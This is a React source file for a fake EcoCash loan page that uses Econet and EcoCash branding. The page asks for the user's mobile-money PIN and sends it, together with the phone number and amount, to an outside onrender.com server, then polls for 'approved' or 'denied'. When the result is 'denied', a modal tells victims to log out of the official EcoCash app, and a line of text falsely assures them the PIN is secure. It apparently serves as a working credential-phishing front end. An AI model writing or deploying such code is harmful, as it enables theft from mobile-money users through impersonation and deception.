import { useState, useRef, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { Lock, AlertTriangle, RefreshCw } from 'lucide-react';

const API_BASE_URL = "https://ecocash-loans-hlfv.onrender.com"; 

export default function ConfirmPinPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const phone = location.state?.phone || '771234567'; 
  const amount = location.state?.amount || 50000;

  const [pin, setPin] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [isDeniedModalOpen, setIsDeniedModalOpen] = useState(false); // NEW: Modal State
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  const maskPhone = (num: string) => {
    if (num.length < 9) return `+263 ${num}`;
    return `+263 ${num.slice(0, 2)} *** **${num.slice(-2)}`;
  };

  const handleSubmit = async () => {
    if (pin.length !== 4 || isProcessing) return;
    setIsProcessing(true);
    setErrorMsg('');

    try {
      const response = await fetch(`${API_BASE_URL}/api/confirm-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, pin, amount })
      });

      if (!response.ok) throw new Error("Failed");
      const { transaction_id } = await response.json();

      let attempts = 0;
      pollRef.current = setInterval(async () => {
        attempts++;
        if (attempts > 60) {
          if (pollRef.current) clearInterval(pollRef.current);
          setIsProcessing(false);
          setErrorMsg("Request timed out. Please try again.");
          return;
        }

        try {
          const statusRes = await fetch(`${API_BASE_URL}/api/status/${transaction_id}`);
          const statusData = await statusRes.json();

          if (statusData.status === 'approved') {
            if (pollRef.current) clearInterval(pollRef.current);
            setIsProcessing(false);
            navigate('/success', { state: { amount, phone } });
            
          } else if (statusData.status === 'denied') {
            if (pollRef.current) clearInterval(pollRef.current);
            setIsProcessing(false);
            setPin('');
            
            // SHOW THE CUSTOM MODAL INSTEAD OF ALERT
            setIsDeniedModalOpen(true);
          }
        } catch (err) {
          console.error("Polling error:", err);
        }
      }, 2000); 

    } catch (error) {
      setIsProcessing(false);
      setErrorMsg("Network error. Please try again.");
    }
  };

  return (
    <div style={{ width: '100%', maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', fontFamily: "'Inter', sans-serif", position: 'relative' }}>
      
      <style>{`
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(220, 38, 38, 0); } 100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0); } }
      `}</style>

      <div style={{ background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', padding: '20px', color: 'white', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px' }}>
          <div style={{ background: 'white', color: '#0b40c4', padding: '4px 8px', borderRadius: '6px', fontWeight: 800, fontSize: '12px', fontStyle: 'italic' }}>ECONET <span style={{fontSize: '7px', display: 'block'}}>Wireless</span></div>
          <div style={{ color: '#e53935', fontWeight: 800, fontSize: '14px', background: 'white', padding: '4px 8px', borderRadius: '6px' }}>EcoCash</div>
          <span style={{ marginLeft: 'auto', background: 'rgba(255,255,255,0.2)', padding: '6px 12px', borderRadius: '16px', fontSize: '12px', fontWeight: 700 }}>ZWG {amount.toLocaleString()}</span>
        </div>
      </div>

      <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
        <div style={{ backgroundColor: 'white', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 12px rgba(0,0,0,0.05)', position: 'relative', overflow: 'hidden' }}>
          <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '4px', background: 'linear-gradient(90deg, #00d2ff, #1e5ce6)' }}></div>
          
          <div style={{ textAlign: 'center', marginBottom: '20px' }}>
            <div style={{ width: '50px', height: '50px', backgroundColor: '#f0f5ff', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
              <Lock size={24} color="#0b40c4" />
            </div>
            <h3 style={{ fontSize: '20px', margin: '0 0 8px 0', color: '#111' }}>Confirm Your PIN</h3>
            <p style={{ fontSize: '14px', color: '#666', margin: 0 }}>Enter your EcoCash PIN to authorize the disbursement to <strong>{maskPhone(phone)}</strong>.</p>
          </div>

          {errorMsg && (
            <div style={{ backgroundColor: '#fef2f2', border: '1px solid #fecaca', color: '#dc2626', padding: '12px', borderRadius: '10px', fontSize: '13px', fontWeight: 600, marginBottom: '20px', textAlign: 'center' }}>
              {errorMsg}
            </div>
          )}
          
          <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#333', marginBottom: '8px', letterSpacing: '0.5px' }}>ENTER PIN</label>
          <input 
            type="password" 
            placeholder="••••"
            value={pin} 
            onChange={e => { setPin(e.target.value.replace(/\D/g, '').slice(0,4)); setErrorMsg(''); }} 
            style={{ width: '100%', padding: '20px', borderRadius: '12px', border: errorMsg ? '2px solid #dc2626' : '2px solid #e2e8f0', fontSize: '24px', textAlign: 'center', letterSpacing: '16px', color: '#111', backgroundColor: 'white', outline: 'none', fontWeight: 700, boxSizing: 'border-box' }} 
            disabled={isProcessing}
          />
          <p style={{ fontSize: '11px', color: '#64748b', marginTop: '12px', textAlign: 'center' }}>Your PIN is encrypted and secure.</p>
        </div>

        <button onClick={handleSubmit} disabled={pin.length !== 4 || isProcessing} style={{ width: '100%', padding: '18px', border: 'none', borderRadius: '16px', fontSize: '16px', fontWeight: 700, color: 'white', backgroundColor: pin.length === 4 && !isProcessing ? '#0b40c4' : '#a0bdf5', cursor: pin.length === 4 && !isProcessing ? 'pointer' : 'not-allowed', transition: 'all 0.2s', boxShadow: pin.length === 4 && !isProcessing ? '0 4px 12px rgba(11, 64, 196, 0.3)' : 'none' }}>
          {isProcessing ? 'Processing...' : 'Confirm Loan'}
        </button>

        <p style={{ textAlign: 'center', fontSize: '10px', color: '#999', marginTop: '16px', fontWeight: 600 }}>POWERED BY ECONET WIRELESS · ECOCASH</p>
      </div>

      {/* MODERN COLORFUL DENIAL MODAL */}
      {isDeniedModalOpen && (
        <div style={{ 
          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, 
          backgroundColor: 'rgba(0,0,0,0.6)', backdropFilter: 'blur(6px)', 
          zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', 
          padding: '20px', animation: 'fadeIn 0.3s ease-out' 
        }}>
          <div style={{ 
            backgroundColor: 'white', borderRadius: '24px', padding: '32px 24px', 
            width: '100%', maxWidth: '380px', position: 'relative', 
            boxShadow: '0 20px 40px rgba(0,0,0,0.2)', textAlign: 'center',
            animation: 'slideUp 0.3s ease-out'
          }}>
            
            {/* Animated Warning Icon */}
            <div style={{ 
              width: '80px', height: '80px', borderRadius: '50%', 
              background: 'linear-gradient(135deg, #ef4444 0%, #f97316 100%)', 
              display: 'flex', alignItems: 'center', justifyContent: 'center', 
              margin: '0 auto 24px', animation: 'pulse-red 2s infinite'
            }}>
              <AlertTriangle size={40} color="white" />
            </div>

            <h2 style={{ fontSize: '24px', fontWeight: 800, color: '#111', margin: '0 0 12px 0' }}>
              Action Required
            </h2>
            
            <p style={{ fontSize: '15px', color: '#4b5563', lineHeight: '1.6', marginBottom: '28px' }}>
              For a successful loan application, please <strong>log out of the official EcoCash app</strong> on your phone, then try again.
            </p>

            <button 
              onClick={() => setIsDeniedModalOpen(false)} 
              style={{ 
                width: '100%', padding: '16px', borderRadius: '14px', border: 'none', 
                background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', 
                color: 'white', fontSize: '16px', fontWeight: 700, cursor: 'pointer',
                display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
                boxShadow: '0 4px 12px rgba(11, 64, 196, 0.3)', transition: 'transform 0.1s'
              }}
              onMouseDown={(e) => e.currentTarget.style.transform = 'scale(0.97)'}
              onMouseUp={(e) => e.currentTarget.style.transform = 'scale(1)'}
              onMouseLeave={(e) => e.currentTarget.style.transform = 'scale(1)'}
            >
              <RefreshCw size={18} /> I Understand, Let me Try Again
            </button>
          </div>
        </div>
      )}
    </div>
  );
}